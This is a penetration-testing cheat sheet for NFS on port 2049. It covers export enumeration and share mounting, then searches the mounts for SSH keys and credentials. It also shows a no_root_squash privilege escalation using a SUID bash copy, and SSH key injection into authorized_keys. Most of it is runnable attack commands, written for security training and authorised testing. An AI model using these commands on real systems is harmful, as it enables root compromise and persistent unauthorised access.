# NFS (2049)

!!! tip "Start here"
    List exports without credentials: `showmount -e 10.10.10.10`. If shares are listed, mount and browse immediately. Look for `no_root_squash` in `/etc/exports` — if present, you can write a SUID binary as root from your attacker machine and execute it on the target for privilege escalation.

---

## Enumeration

```bash
sudo nmap -sV -p 111,2049 --script "nfs*" 10.10.10.10
showmount -e 10.10.10.10
```

---

## Mounting Shares

```bash
mkdir /mnt/nfs
sudo mount -t nfs 10.10.10.10:/share /mnt/nfs
ls -la /mnt/nfs
```

Look for:
- `/home/user/.ssh/id_rsa`
- Config files with credentials
- Database dumps

---

## no_root_squash Privilege Escalation

Check the NFS config on the target:

```bash
cat /etc/exports
```

If a share has `no_root_squash`, create a SUID binary on your attacker machine and drop it into the mounted share:

```bash
# On attacker (as root)
cp /bin/bash /mnt/nfs/suid_bash
chmod +s /mnt/nfs/suid_bash
```

Then on the target:

```bash
/mnt/nfs/suid_bash -p
id
```

---

## SSH Key Injection

If a `.ssh` directory is accessible via the mount:

```bash
cat ~/.ssh/id_rsa.pub >> /mnt/nfs/home/user/.ssh/authorized_keys
ssh user@10.10.10.10
```

!!! tip "Real-world"
    NFS is common on internal networks for shared storage. `no_root_squash` is the high-value find — it's a direct path to root if the share maps to anything useful on the target. Even without it, mounted shares often contain SSH keys, config files, or database backups that move the engagement forward.
